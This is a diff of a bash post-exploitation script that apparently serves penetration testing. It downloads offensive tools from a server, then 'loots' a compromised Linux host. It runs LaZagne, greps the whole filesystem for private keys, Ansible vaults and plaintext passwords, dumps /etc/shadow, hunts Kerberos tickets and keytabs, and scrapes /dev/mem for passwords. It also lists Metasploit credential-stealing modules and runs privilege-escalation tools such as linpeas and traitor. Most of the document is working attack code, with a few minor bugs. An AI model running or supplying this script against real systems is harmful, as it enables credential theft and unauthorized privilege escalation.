@@ -81,83 +81,75 @@ download_tools() {
             curl -k "$server_url/tools/pspy32" -o pspy32
             curl -k "$server_url/tools/lazagne32" -o lazagne32
         fi
-    fi 
+    fi
+    unzip nmap.zip
 }
 
-looting() {
-    mkdir loot
-    ./lazagne* all | tee -a loot/lazagne.txt
-    echo "=======================PRIV KEYS:" | tee -a priv_keys.txt
-    grep -r -a "PRIVATE KEY-----" / 2>/dev/null | tee -a priv_keys.txt
-    echo "=======================ANSBILE VAULT:" | tee -a ansible_vault.txt
-    grep -r -a "\!vault" / 2>/dev/null  | tee -a ansible_vault.txt
-    echo "=======================SYSLOG - grep it:" | tee -a yslog.txt
-    cat /var/log/syslog | tee -a syslog.txt
-    echo "CHECK THESE LOCATIONS" | tee -a files_to_check.txt
-    echo "=======================AUTH LOGS:" | tee -a files_to_check.txt
-    find / -name auth.log 2>/dev/null | tee -a files_to_check.txt
-    echo "=======================DIRECTORY LISTERNING OF THE: /var/log" | tee -a files_to_check.txt
-    ls /var/log | tee -a var_log_directory_list.txt
-    echo "=======================CONFIG FILES (config.php!):" | tee -a files_to_check.txt
-    locate .config | tee -a files_to_check.txt
-    locate config. | tee -a files_to_check.txt
-    echo "=======================HISTORY FILES (.bash_history!):" | tee -a files_to_check.txt
-    find / -name "*_history" -xdev 2>/dev/null
-    echo "=======================PASSWORD FILES:" | tee -a files_to_check.txt
-    locate password | tee -a files_to_check.txt
-    echo "=======================OLD PASSWORDS:" | tee -a files_to_check.txt
-    find / -name opasswd -xdev 2>/dev/null | tee -a files_to_check.txt
-    echo "=======================GNOME KEYRING - cracking:" | tee -a files_to_check.txt
-    locate login.keyring; locate user.keystore | tee -a files_to_check.txt
-    echo "=======================PLAIN TEXT PASSWORDS:" | tee -a plain_text_pass.txt
-    grep --color=auto -rnw '/' -ie "PASSWORD\|PASSWD" --color=always 2> /dev/null | tee -a plain_text_pass.txt
-    echo "=======================PASSWD FILE (cracking 1)" | tee -a passwd.txt
-    cat /etc/passwd
-    echo "=======================SHADOW FILE (cracking 2)" | tee -a shadow.txt
-    cat /etc/shadow
-    echo "=======================RECENTLY MODIFIED FILES (30 MIN)" | tee -a recently_modified.txt
-    find / -mmin -30 -xdev 2>/dev/null | tee -a recently_modified.txt
-    echo "=======================CREDS IN MEMORY" | tee -a recently_modified.txt
-    strings /dev/mem -n10 | grep --color=always -ie "PASSWORD|PASSWD"
 
-    echo "ADDITIONAL MODULES - DO NOT FORGET:
-    use post/linux/gather/enum_system
-    use post/linux/gather/enum_users_history
-    use post/linux/gather/gnome_commander_creds
-    use post/linux/gather/hashdump
-    use post/linux/gather/gnome_keyring_dump
-    use post/linux/gather/enum_psk
-    use post/linux/gather/enum_configs
-    use post/linux/gather/ecryptfs_creds
-    use post/linux/gather/mount_cifs_creds
-    use post/linux/gather/openvpn_credentials
-    use post/linux/gather/phpmyadmin_credsteal
-    use post/linux/gather/pptpd_chap_secrets
-    use post/linux/gather/tor_hiddenservices
-    use post/multi/gather/filezilla_client_cred
-    use post/multi/gather/firefox_creds
-    use post/multi/gather/gpg_creds
-    use post/multi/gather/grub_creds
-    use post/multi/gather/irssi_creds
-    use post/multi/gather/lastpass_creds
-    use post/multi/gather/maven_creds
-    use post/multi/gather/netrc_creds
-    use post/multi/gather/pgpass_creds
-    use post/multi/gather/pidgin_cred
-    use post/multi/gather/remmina_creds
-    use post/multi/gather/rsyncd_creds
-    use post/multi/gather/ssh_creds
-    use post/multi/gather/thunderbird_creds"
+looting() {
+    cd loot
+    ./lazagne* all | tee -a loot/lazagne.txt
+    echo "======================= POSSIBLE PRIV KEYS:" | tee -a loot/priv_keys.txt
+    grep -r -a "PRIVATE KEY-----" / 2>/dev/null | tee -a loot/priv_keys.txt
+    echo "======================= POSSIBLE ANSBILE VAULT:" | tee -a loot/ansible_vault.txt
+    grep -r -a "\!vault" / 2>/dev/null  | tee -a loot/ansible_vault.txt
+    echo "======================="
+    echo "CHECK THESE LOCATIONS" | tee -a loot/files_to_check.txt
+    echo "======================= AUTH LOGS:" | tee -a loot/files_to_check.txt
+    find / -name auth.log 2>/dev/null | tee -a loot/files_to_check.txt
+    echo "======================= DIRECTORY LISTERNING OF THE: /var/log" | tee -a loot/files_to_check.txt
+    ls /var/log | tee -a loot/var_log_directory_list.txt
+    echo "======================= CONFIG FILES (config.php!):" | tee -a loot/files_to_check.txt
+    locate .config | tee -a loot/files_to_check.txt
+    locate config. | tee -a loot/files_to_check.txt
+    echo "======================= HISTORY FILES (.bash_history!):" | tee -a loot/files_to_check.txt
+    find / -name "*_history" -xdev 2>/dev/null | loot/files_to_check.txt
+    echo "======================= PASSWORD FILES:" | tee -a loot/files_to_check.txt
+    locate password | tee -a loot/files_to_check.txt
+    echo "======================= OLD PASSWORDS:" | tee -a loot/files_to_check.txt
+    find / -name opasswd -xdev 2>/dev/null | tee -a loot/files_to_check.txt
+    echo "======================= GNOME KEYRING - cracking:" | tee -a loot/files_to_check.txt
+    locate login.keyring; locate user.keystore | tee -a loot/files_to_check.txt
+    echo "======================= /etc/fstab:" | tee -a loot/files_to_check.txt
+    locate /etc/fstab | tee -a loot/files_to_check.txt
+    echo "======================= PLAIN TEXT PASSWORDS:" | tee -a loot/plain_text_pass.txt
+    grep --color=auto -rnw '/' -ie "PASSWORD\|PASSWD" --color=always 2> /dev/null | tee -a loot/plain_text_pass.txt
+    echo "======================= KERBEROS - CACHE" | tee -a loot/kerberos.txt
+    env | grep KRB5CCNAME | tee -a loot/kerberos.txt
+    find / -name "krb5cc_*" 2>/dev/null
+    echo "======================= KERBEROS - CURRENT TICKETS" | tee -a loot/kerberos.txt
+    klist | tee -a loot/kerberos.txt
+    echo "======================= KERBEROS - KEYTABS" | tee -a loot/kerberos.txt
+    find / -name "*.keytab" 2>/dev/null | tee -a loot/kerberos.txt
+    echo "======================= ADDITIONAL MSF MODULES - DO NOT FORGET:
+run post/linux/gather/hashdump
+run post/multi/gather/lastpass_creds
+run post/linux/gather/phpmyadmin_credsteal
+run post/linux/gather/pptpd_chap_secrets
+run post/multi/gather/filezilla_client_cred
+run post/multi/gather/firefox_creds
+run post/multi/gather/maven_creds
+run post/multi/gather/netrc_creds
+run post/multi/gather/remmina_creds
+run post/multi/gather/pgpass_creds
+run post/multi/gather/rsyncd_creds
+run post/multi/gather/ssh_creds"
+    echo "======================= CREDS IN MEMORY - it will take a moment ..." | tee -a loot/creds_in_memory.txt
+    strings /dev/mem -n10 | grep --color=always -ie "PASSWORD|PASSWD" | tee -a loot/creds_in_memory.txt
 }
 
 escalation() {
     mkdir priv
+    echo "======================= PTES => http://www.pentest-standard.org/index.php/Post_Exploitation"
     ./linpeas.sh -a | tee -a priv/linpeas.txt
     ./les.sh | tee -a priv/les.txt
     ./traitor* | tee -a priv/traitor.txt
+    echo "======================= ADDITIONAL MSF MODULES - DO NOT FORGET:
+    run post/linux/gather/enum_system
+    run post/linux/gather/enum_configs
+    run post/linux/gather/enum_users_history"
     ./pspy* | tee -a priv/pspy.txt
 }
-
 
 
 download_tools
